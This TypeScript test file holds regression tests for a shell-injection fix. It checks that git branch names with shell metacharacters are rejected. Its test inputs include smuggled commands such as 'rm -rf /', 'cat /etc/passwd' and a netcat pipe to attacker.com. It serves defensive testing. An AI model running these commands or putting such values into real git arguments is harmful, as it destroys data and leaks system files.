// Regression tests for shell-injection fix (security review PR #63 comment 4363668665).

import { describe, it, expect } from 'vitest';
import { validateGitRef, forbiddenPathGate } from './forbidden-paths.js';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

// ---------------------------------------------------------------------------
// validateGitRef unit tests
// ---------------------------------------------------------------------------

describe('validateGitRef', () => {
  it('accepts valid branch names', () => {
    expect(validateGitRef('main')).toBe('main');
    expect(validateGitRef('fix/r1/c1')).toBe('fix/r1/c1');
    expect(validateGitRef('feature-branch')).toBe('feature-branch');
    expect(validateGitRef('v1.0.0')).toBe('v1.0.0');
  });

  it('rejects shell metacharacters (injection vector)', () => {
    expect(() => validateGitRef('main; rm -rf /')).toThrow();
    expect(() => validateGitRef('main && cat /etc/passwd')).toThrow();
    expect(() => validateGitRef('main | nc attacker.com 80')).toThrow();
    expect(() => validateGitRef('$(evil)')).toThrow();
    expect(() => validateGitRef('`evil`')).toThrow();
  });

  it('rejects leading dot', () => {
    expect(() => validateGitRef('.hidden')).toThrow();
  });

  it('rejects trailing dot', () => {
    expect(() => validateGitRef('branch.')).toThrow();
  });

  it('rejects double dot', () => {
    expect(() => validateGitRef('main..evil')).toThrow();
  });

  it('rejects @{ sequence', () => {
    expect(() => validateGitRef('branch@{0}')).toThrow();
  });

  it('rejects backslash', () => {
    expect(() => validateGitRef('branch\\name')).toThrow();
  });
});

// ---------------------------------------------------------------------------
// forbiddenPathGate — RCE regression test
// ---------------------------------------------------------------------------

describe('forbiddenPathGate RCE regression', () => {
  it('rejects injection in branch and does not execute the injected command', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bh-fp-rce-'));
    const sentinel = path.join(os.tmpdir(), 'v31-rce-forbidden-paths');

    // Ensure sentinel does not exist from a previous run
    if (fs.existsSync(sentinel)) fs.rmSync(sentinel);

    try {
      expect(() =>
        forbiddenPathGate(tmpDir, `main; touch ${sentinel}`, 'main', false),
      ).toThrow();
      expect(fs.existsSync(sentinel)).toBe(false);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
      if (fs.existsSync(sentinel)) fs.rmSync(sentinel);
    }
  });

  it('rejects injection in baseBranch and does not execute the injected command', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bh-fp-rce2-'));
    const sentinel = path.join(os.tmpdir(), 'v31-rce-forbidden-paths-base');

    if (fs.existsSync(sentinel)) fs.rmSync(sentinel);

    try {
      expect(() =>
        forbiddenPathGate(tmpDir, 'fix/branch', `main; touch ${sentinel}`, false),
      ).toThrow();
      expect(fs.existsSync(sentinel)).toBe(false);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
      if (fs.existsSync(sentinel)) fs.rmSync(sentinel);
    }
  });
});
